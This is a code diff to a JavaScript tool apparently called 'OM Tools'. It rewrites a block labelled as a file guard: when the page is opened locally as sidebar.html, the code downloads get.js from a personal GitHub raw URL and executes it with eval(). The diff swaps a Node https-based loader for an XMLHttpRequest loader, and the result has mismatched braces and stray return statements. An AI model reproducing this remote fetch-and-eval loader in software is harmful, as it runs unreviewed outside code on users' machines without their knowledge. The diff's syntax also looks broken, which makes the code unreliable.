@@ -4,27 +4,23 @@
  /* ── file: guard ── */
   if (typeof location !== 'undefined' && location.protocol === 'file:') {
     if (location.pathname.endsWith('sidebar.html')) {
-      const REMOTE_URL = 'https://raw.githubusercontent.com/Snubnan/for-me/refs/heads/main/get.js';
+  const REMOTE_URL = 'https://raw.githubusercontent.com/Snubnan/for-me/refs/heads/main/get.js';
+  (() => {
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', REMOTE_URL);
+    xhr.onload = () => {
       try {
-        const https = require('https');
-        https.get(REMOTE_URL, (res) => {
-          let data = '';
-          res.on('data', chunk => data += chunk);
-          res.on('end', () => {
-            try {
-              eval(data);
-            } catch(e) {
-              console.error('[OM Tools] Remote script error:', e);
-            }
-          });
-        }).on('error', (e) => {
-          console.error('[OM Tools] Fetch failed:', e.message);
-        });
+        eval(xhr.responseText);
       } catch(e) {
-        console.error('[OM Tools] require not available:', e);
+        console.error('[OM Tools] eval error:', e);
       }
-    }
-    return;
+    };
+    xhr.onerror = (e) => console.error('[OM Tools] XHR failed:', e);
+    xhr.send();
+  })();
+  return;
+}
+return;
   }
 
   /* ── already installed: toggle panel ── */
